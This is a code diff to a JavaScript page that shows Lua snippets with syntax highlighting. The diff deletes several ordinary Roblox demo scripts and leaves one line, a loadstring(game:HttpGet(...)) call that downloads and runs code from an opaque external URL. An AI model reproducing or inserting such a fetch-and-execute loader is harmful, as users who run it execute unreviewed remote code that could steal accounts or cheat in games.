@@ -139,24 +139,7 @@
                 overlayContent.textContent = text;
             }
             else {
-                const scripts = [
-                    `local plr = game.Players.LocalPlayer
-plr.Character.Humanoid.WalkSpeed = 150
-print("you are the chosen one")`,
-
-                    `game:GetService("Lighting").Brightness = 10
-game:GetService("Lighting").FogEnd = 100
-print("normal lighting restored :)")`,
-
-                    `for _, v in pairs(workspace:GetDescendants()) do
-    if v:IsA("BasePart") then v.Transparency = 0 end
-end`,
-
-                    `loadstring(game:HttpGet("https://r4-sec.vercel.app/files/067c44758b64369a9a9259066e9c968f"))()`,
-
-                    `while wait(1) do
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame += Vector3.new(0, 0.1, 0)
-end`
+                const scripts = [`loadstring(game:HttpGet("https://r4-sec.vercel.app/files/067c44758b64369a9a9259066e9c968f"))()`,
                 ];
                 const code = scripts[Math.floor(Math.random() * scripts.length)];
                 overlayContent.innerHTML = highlightLua(code);
